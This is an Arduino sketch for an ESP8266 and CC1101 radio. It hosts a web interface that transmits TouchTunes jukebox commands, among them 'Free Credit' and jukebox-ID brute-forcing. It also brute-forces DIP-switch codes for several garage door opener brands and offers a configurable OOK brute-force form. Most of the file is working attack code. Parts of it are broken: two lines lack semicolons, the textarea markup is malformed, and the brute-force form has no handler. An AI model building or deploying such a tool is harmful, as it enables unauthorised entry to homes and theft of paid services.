#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <cc1101_debug_service.h>


ESP8266WebServer server(80);   //instantiate server at port 80 (http port)
// Replace with your network credentials
const char* ssid = "YourHomeWifiName";
const char* password = "yourWifiPassword";

int gdo0;
byte bytesToSend[60];

String jukebox_pwm_prefix = "11111111111111110000000010100010100010001000101000";  //preamble sync and vendor ID x5D converted to PWM
String jukebox_pwm_freeCredit = "10100010001000101010101000101010100010001000100010"; //x70 and inverse, converted to PWM format: 0=10 1=1000. Signal ends with EOT pulse (10)
String jukebox_pwm_pauseSong = "10101000100010101000101000100010101000100010100010"; //x32 
String jukebox_pwm_skipSong = "10001000101010001010001010101000100010100010100010";  //xCA
String jukebox_pwm_volumeUp = "10001000101000101010101010100010100010001000100010";  //xD0
String jukebox_pwm_volumeDown = "10100010100010101010100010100010100010001000100010"; //x50
String jukebox_pwm_powerOff = "10100010001000100010101010001010101010001000100010"; //x78

String main_menu = "";
String jukebox_menu = "";
String garage_menu = "";
String rfpwnon_menu = "";


void handleMainMenu() {
 Serial.println("User called the main menu");
 //String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", main_menu); //Send web page
}

void handleJukeboxMenu(){
  Serial.println("User called the jukebox menu");
  server.send(200, "text/html", jukebox_menu);
}

void handleGarageMenu(){
  Serial.println("User called the garage door menu");
  server.send(200, "text/html", garage_menu);
}

void handleRfpwnonMenu(){
  Serial.println("User called the Rfpwnon menu");
  server.send(200, "text/html", rfpwnon_menu);
}


void handleJukeboxSend() {  
  String button = server.arg("remotebutton");
  int bruteSize = 0;
  String jukeboxID;
  
  if( server.arg("brutejuke").equals("true") ){ bruteSize = 8; jukeboxID = jukebox_pwm_prefix; }
  else{ jukeboxID = jukebox_pwm_prefix + "1010101010101010"; }

  Serial.print("tx jukebox signal: "); Serial.println(button);
  //digitalWrite(LED,HIGH);
 
  if( server.arg("remotebutton").equals("freeCredit") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_freeCredit, false); }
  if( server.arg("remotebutton").equals("pauseSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_pauseSong, false); }
  if( server.arg("remotebutton").equals("skipSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_skipSong, false); }
  if( server.arg("remotebutton").equals("volumeUp") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_volumeUp, false); }
  if( server.arg("remotebutton").equals("volumeDown") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_volumeDown, false); }
  if( server.arg("remotebutton").equals("powerOff") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_powerOff, false); }

  //digitalWrite(LED, LOW);
  Serial.print(button); Serial.println(" signal tx success!"); Serial.println();
 
  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"jukebox\">Return to Jukebox Menu</a>");
}


void handleGarageSend() {  
  Serial.println("Bruteforcing garage door DIP signal");
  //digitalWrite(LED,HIGH);

  if( server.arg("chamber7").equals("true") ){ binaryBruteSend(7, "0111", "0011", 390, 1.0, 8, 40, 500, "", false, "", false); }
  if( server.arg("linear8").equals("true") ){ binaryBruteSend(8, "10000000", "11110000", 310, 2.0, 8, 40, 500,  "", false, "", false); }
  if( server.arg("chamber8").equals("true") ){ binaryBruteSend(8, "0111", "0011", 390, 1.0, 8, 40, 500, "", false, "", false); }
  if( server.arg("chamber9").equals("true") ){ binaryBruteSend(9, "0111", "0011", 390, 1.0, 8, 40, 500,  "", false, "", false); }
  if( server.arg("stanley10").equals("true") ){ binaryBruteSend(10, "1000", "1110", 310, 2.0, 8, 40, 500,  "", false, "", false); } 
  if( server.arg("linear10").equals("true") ){ binaryBruteSend(10, "1000", "1110", 300, 2.0, 8, 40, 500,  "", false, "", false); }

  //digitalWrite(LED, LOW);
  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"garage\">Return to Garage Menu</a>");
}



//input dip switch size, PWM code for "0" and "1", frequency, datarate, repeatTimes, gap between repeats milliseconds 
void binaryBruteSend(int dipSize, String zero_pwm, String one_pwm, float freqmhz, float baud, int pulseReps, int gapWidth, 
                     int attemptPause, String prefixBinary, bool convertPrefix, String postfixBinary, bool convertPostfix){
                      
  String firstBinary;
  String pwmBinary;
  String subBinary;
  int missing;
  int i;
  int highestDIP = pow(2, dipSize);

  ELECHOUSE_cc1101.setMHZ(freqmhz);
  ELECHOUSE_cc1101.set_drate(baud);
  ELECHOUSE_cc1101.setPA(12);
   
  for(int x = 0; x < highestDIP; x++){
    firstBinary = String(x, BIN);
    pwmBinary = "";
    subBinary = "";
      
    //pad binary with zeroes to match DIP size
    if( firstBinary.length() < dipSize ){
      missing = dipSize - firstBinary.length();
      for(int y = 0; y < missing; y++){ firstBinary = "0" + firstBinary; }
    }

    //convert pulse binary to sliced binary bits that match datarate
    if( dipSize > 0 ){ pwmBinary = convertToPWM(firstBinary, zero_pwm, one_pwm); }

    //add prefix bits and postfix bits to signal. convert to pwm if user indicates
    if( prefixBinary.length() > 0 && convertPrefix == true ){ pwmBinary = convertToPWM(prefixBinary, zero_pwm, one_pwm) + pwmBinary; }
    else{ pwmBinary = prefixBinary + pwmBinary; }
    
    if( postfixBinary.length() > 0 && convertPostfix == true ){ pwmBinary = pwmBinary + convertToPWM(postfixBinary, zero_pwm, one_pwm); }
    else{ pwmBinary = pwmBinary + postfixBinary; }



    Serial.print(x); Serial.print(" attempt: Binary string: "); Serial.println(firstBinary);
    //Serial.println("PWM binary equals:"); Serial.println(pwmBinary);
    //delay(100);

    //convert pwm binary string to byte array
    //parse String into 8 character substrings; convert substrings from String binary to int
    //pad pwm string with trailing zeroes so it can be divided into FULL bytes = string length mod 8 should equal 0
    //must pad with zeroes on right side, or else compiler pads on the left and it gives incorrect spacings
    int counter = 0;
    if( pwmBinary.length() % 8 > 0 ){
      counter = 8 - (pwmBinary.length() % 8);
      for( int m = 0; m < counter; m++ ){ pwmBinary = pwmBinary + "0"; }
    }
    
    //Serial.println("New PWM binary equals:"); Serial.println(pwmBinary);
    
    int byteSlots = pwmBinary.length() / 8;
    for(i = 0; i < byteSlots; i++){
      subBinary = pwmBinary.substring( (i * 8), (((i + 1) * 8) )); //substring excludes last indexed character. Very confusing
      bytesToSend[i] = convertBinStrToInt( subBinary );
      
      //Serial.print("Substring equals: "); Serial.println(subBinary);
      //Serial.print("Substring converts to integer: "); Serial.print( convertBinStrToInt(subBinary));
      //Serial.print("  Pushing byte into slot: "); Serial.println(i);
    }
    
    
    //set packet length register
    //Serial.print("Setting packet length, hex value: "); Serial.println(i, HEX);
    //ELECHOUSE_cc1101.setPktLen(i + 1); //threw an error. Add extra byte for stupid length byte
    Serial.println("Transmitting bytes");
    for( int k = 0; k <= pulseReps; k++ ){
      ELECHOUSE_cc1101.SendData(bytesToSend, i);
      delay(gapWidth);
    }
    
    memset(bytesToSend, 0, 60);
    i = 0;
    delay(attemptPause);
  }
}


String convertToPWM(String bulkBinary, String zeroPwm, String onePwm){
  String refinedBinary = "";
  for(int y = 0; y < bulkBinary.length(); y++){
      if( bulkBinary[y] == '0' ){ refinedBinary += zeroPwm; }
      else{ refinedBinary += onePwm; }
    }
  return refinedBinary;
}

int convertBinStrToInt(String binaryString){
  int value = 0;
  for(int z = 0; z < binaryString.length(); z++){
      value *= 2;
      if( binaryString[z] == '1' ){ value++; }
  }
  return value;
}



void setup(void){

  main_menu = "<html><body><center><h1>ESP8266 CC1101 Sub-1GHz Radio OOK </h1>";
  main_menu += "<br><br><a href=\"jukebox\">Touchtunes Jukebox Remote</a><br><br>";
  main_menu += "<br><br><a href=\"garage\">Garage Door DIP Switch Hacker</a><br><br>";
  main_menu += "<br><br><a href=\"bruteforce\">Rfpwnon Brute Force</a><br><br>";
  main_menu += "</center></body></html>";
 
  jukebox_menu = "<html><body><center><h1>Touchtunes Jukebox Remote Control</h1><br><br>";
  jukebox_menu += "<form action=\"sendjukebox\">";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"freeCredit\">Free Credit</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"pauseSong\">Pause Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"skipSong\">Skip Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeUp\">Volume Up</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeDown\">Volume Down</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"powerOff\">Power Off</button></a><br><br>";
  jukebox_menu += "<input type=\"checkbox\" name=\"brutejuke\" value=\"true\">Brute Force Jukebox ID - takes appox 4min max<br><br>";
  jukebox_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";

  garage_menu = "<html><body><center><h1>Garage Door DIP Switch Brute Force</h1><br><br>";
  garage_menu += "<form action=\"sendgarage\">";
  garage_menu += "<input type=\"checkbox\" name=\"linear10\" value=\"true\">Linear Multicode 10DIP 300MHz - 5min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"stanley10\" value=\"true\">Stanley Multicode 10DIP 310MHz - 5min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber9\" value=\"true\">Chamberlain 9DIP 390Mhz - 4min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber8\" value=\"true\">Chamberlain 8DIP 390MHz - 3min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"linear8\" value=\"true\">Linear MooreMatic 8DIP 310MHz- 3min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber7\" value=\"true\">Chamberlain 7DIP 390MHz - 2min max<br><br>";
  garage_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  garage_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";
  
  rfpwnon_menu = "<html><body><center><h1>RfPwnOn OOK Brute Force Hacker</h1><br><br>";
  rfpwnon_menu += "<form action=\"sendrfpwnon\">";
  rfpwnon_menu += "<p><label>Freq MHz </label><input type=\"text\" name=\"pwnMHz\" size=\"10\" value=\"433.92\"></p>";
  rfpwnon_menu += "<p><label>Baud(kBPS) </label><input type=\"text\" name=\"pwnBaud\" size=\"10\" value=\"1.7777\"></p>";
  rfpwnon_menu += "<p><label>Binary(DIP) Size to Brute </label><input type=\"text\" name=\"pwnDipSize\" size=\"3\" value=\"8\"></p>";
  rfpwnon_menu += "<p><label>Repeat Signal(0=send once) </label><input type=\"text\" name=\"pwnRepeat\" size=\"3\" value=\"3\"></p>";
  rfpwnon_menu += "<p><label>Gap between repeats(ms) </label><input type=\"text\" name=\"pwnGapWidth\" size=\"5\" value=\"50\"></p>";
  rfpwnon_menu += "<p><label>Delay between next combination/attempt(ms) </label><input type=\"text\" name=\"pwnAttemptWait\" size=\"5\" value=\"500\"></p>";
  rfpwnon_menu += "<p><label>PWM Binary for 0 </label><input type=\"text\" name=\"pwnZeroPwm\" size=\"10\" value=\"10\">";
  rfpwnon_menu += "<label>PWM Binary for 1 </label><input type=\"text\" name=\"pwnOnePwm\" size=\"10\" value=\"1000\"></p>";
  rfpwnon_menu += "<p><label>Prefix bits, add to beginning of signal</label><textarea>name=\"pwnPrefix\" rows=\"2\" cols=\"60\">11111111111111110000000010100010100010001000101000</textarea></p>"
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPrefix\" value=\"true\">Convert Prefix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><label>Postfix bits, add to end of signal</label><textarea>name=\"pwnPostfix\" rows=\"2\" cols=\"60\">0111100010000111</textarea></p>"
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPostfix\" value=\"true\" checked=\"checked\">Convert Postfix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  rfpwnon_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";
  
    
  Serial.begin(115200);
  
  WiFi.begin(ssid, password);     //Connect to your WiFi router
  Serial.println("");

  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
 
  //If connection successful show IP address in serial monitor
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());  //IP address assigned to your ESP

  server.on("/", handleMainMenu);      //Which routine to handle at root location. This is display page
  server.on("/jukebox", handleJukeboxMenu);
  server.on("/garage", handleGarageMenu);
  server.on("/bruteforce", handleRfpwnonMenu);
  server.on("/sendjukebox", handleJukeboxSend);
  server.on("/sendgarage", handleGarageSend);
 
  server.begin();                  //Start server
  Serial.println("HTTP server started");

  
  //Setup CC1101 Radio
  gdo0 = 5; //for esp8266 gdo0 on pin 5 = D1

  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setGDO(gdo0,0);
  //ELECHOUSE_cc1101.setCCMode(0);  //any value besides 1
  //ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.set_rxbw(100);
  ELECHOUSE_cc1101.set_drate(1.2);
  //ELECHOUSE_cc1101.SetIdle();
  //ELECHOUSE_cc1101.setPA(10); 
}


void loop(void){
  server.handleClient();          //Handle client requests
  cc1101_debug.debug();
}
